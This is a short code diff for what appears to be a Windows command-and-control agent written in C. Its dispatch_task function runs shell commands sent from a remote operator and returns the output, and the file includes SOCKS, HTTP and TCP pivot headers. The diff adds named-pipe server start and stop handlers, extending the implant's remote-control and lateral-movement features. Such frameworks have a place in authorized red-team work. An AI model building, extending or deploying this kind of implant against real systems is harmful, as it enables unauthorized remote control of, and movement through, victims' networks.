@@ -8,6 +8,7 @@
 #include "rsocks.h"
 #include "http_pivot.h"
 #include "tcp_pivot.h"
+#include "pipe_server.h"
 #include <winsock2.h>
 #include <ws2tcpip.h>
 #include <windows.h>
@@ -3301,8 +3302,15 @@ void dispatch_task(AgentTask *task) {
         char *out4 = run_shell(sh_cmd2);
         agent_send_result(task->id, out4?out4:"", ""); free(out4);
     }
-    else if (strcmp(type_upper, "PIPE_START") == 0 || strcmp(type_upper, "PIPE_STOP") == 0) {
-        agent_send_result(task->id, "", "PIPE_START/STOP: not yet implemented in C agent");
+    else if (strcmp(type_upper, "PIPE_START") == 0) {
+        char *out = pipe_server_start(task->args && task->args[0] ? task->args : "");
+        agent_send_result(task->id, out ? out : "[-] pipe_server_start failed", "");
+        free(out);
+    }
+    else if (strcmp(type_upper, "PIPE_STOP") == 0) {
+        char *out = pipe_server_stop(task->args && task->args[0] ? task->args : "");
+        agent_send_result(task->id, out ? out : "[-] pipe_server_stop failed", "");
+        free(out);
     }
     else if (strcmp(type_upper, "PORTFWD_ADD") == 0 ||
              strcmp(type_upper, "PORTFWD_DEL") == 0 ||
